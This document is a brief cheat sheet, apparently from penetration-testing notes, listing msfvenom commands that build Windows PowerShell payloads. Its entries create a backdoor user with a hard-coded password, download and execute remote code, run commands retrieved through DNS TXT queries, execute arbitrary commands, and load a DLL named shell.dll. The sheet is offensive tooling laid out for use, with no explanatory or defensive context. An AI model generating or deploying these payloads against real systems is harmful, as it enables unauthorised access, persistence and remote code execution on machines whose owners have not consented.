# Exec Payloads

## Add User

`$ msfvenom -p cmd/windows/powershell/adduser user=sysadmin pass=Password1234! wmic=[true | false] custom=<group_name> -f raw`

`$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec -f raw`

## Download and Execute

`$ msfvenom -p cmd/windows/powershell/download_exec`

## DNS TXT Query Exec

`$ msfvenom -p cmd/windows/powershell/dns_txt_query_exec dnszone=<domain.com>`

## Execute

`$ msfvenom -p cmd/windows/powershell/exec cmd=<commands>`

`$ msfvenom -p cmd/windows/powershell/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>`

`$ msfvenom -p cmd/windows/powershell/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>`

`$ msfvenom -p cmd/windows/powershell/x64/exec cmd=<commands>`

`$ msfvenom -p cmd/windows/powershell/x64/loadlibrary dll=C:\\path\\to\\shell.dll exitfunc=<seh | thread | process | none>`

`$ msfvenom -p cmd/windows/powershell/x64/messagebox icon=<NO | ERROR | INFORMATION | WARNING | QUESTION> text="<text>" title="<title>" exitfunc=<seh | thread | process | none>`

### Text-To-Speech

`$ msfvenom -p cmd/windows/powershell/speak_pwned`